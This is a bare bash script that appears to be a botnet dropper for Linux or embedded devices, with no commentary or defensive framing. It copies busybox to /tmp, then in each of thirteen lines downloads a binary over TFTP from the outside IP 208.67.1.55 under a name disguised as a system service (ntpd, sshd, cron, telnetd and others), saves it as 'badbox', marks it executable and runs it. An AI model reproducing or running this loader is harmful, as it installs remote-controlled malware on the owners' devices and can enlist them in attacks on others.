#!/bin/bash
ulimit -n 1024
cp /bin/busybox /tmp/
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ntpd -g 208.67.1.55;cat ntpd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sshd -g 208.67.1.55;cat sshd >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r openssh -g 208.67.1.55;cat openssh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r bash -g 208.67.1.55;cat bash >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r tftp -g 208.67.1.55;cat tftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r wget -g 208.67.1.55;cat wget >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r cron -g 208.67.1.55;cat cron >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ftp -g 208.67.1.55;cat ftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r pftp -g 208.67.1.55;cat pftp >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r sh -g 208.67.1.55;cat sh >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r ' ' -g 208.67.1.55;cat ' ' >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r apache2 -g 208.67.1.55;cat apache2 >badbox;chmod +x *;./badbox
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r telnetd -g 208.67.1.55;cat telnetd >badbox;chmod +x *;./badbox
